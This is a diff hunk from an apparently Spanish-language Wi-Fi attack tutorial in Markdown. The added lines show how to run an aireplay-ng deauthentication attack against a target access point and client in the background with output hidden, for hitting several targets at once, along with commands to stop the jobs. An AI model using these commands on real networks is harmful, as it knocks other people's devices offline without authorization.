@@ -89,6 +89,13 @@ Vamos a pretender que somos el cliente cambiando nuestro mac a este y enviar al 
 ```
 aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
 ```
+if you want to do it in the background whitout output on the terminal (usful to deaut multiple targets)
+```
+aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0 &> /dev/null &
+jobs (see jobs runing)
+kill %1 (kill job 1)
+killall aireplay-ng
+```
 en algunos casos este comando no funcionara a menos que estemos usando airodump-ng contra la red objetivo
 pra eso lanzamos el sigiente comando en la terminal de al lado
 ```
